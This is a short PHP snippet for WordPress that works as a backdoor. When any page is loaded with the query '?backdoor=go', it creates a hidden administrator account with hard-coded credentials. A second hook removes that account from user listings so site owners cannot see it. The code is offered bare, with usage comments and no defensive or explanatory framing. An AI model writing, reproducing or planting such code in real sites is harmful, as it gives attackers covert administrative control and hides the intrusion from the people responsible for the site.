<?php   

//URL: https://[insert website here]/?backdoor=go
//username new_admin userpass new_pass

add_action( 'wp_head', 'wp_backdoor' );

function  wp_backdoor() {
    if ( $_GET['backdoor'] == 'go' ) {
	    require( 'wp-includes/registration.php' );
	    if ( !username_exists( 'new_admin' ) ) {
		    $user_id = wp_create_user( 'new_admin', 'new_pass' );
		    $user = new  WP_User( $user_id );
		    $user->set_role( 'administrator' );
	    }
    }
}

add_action('pre_user_query','dt_pre_user_query');

function  dt_pre_user_query($user_search) {
    global  $current_user;
    $username = $current_user->user_login;

    if ($username != 'new_admin') {
	    global  $wpdb;
	    $user_search->query_where = str_replace('WHERE 1=1',
		    "WHERE 1=1 AND {$wpdb->users}.user_login != 'new_admin'",$user_search->query_where);
    }
}
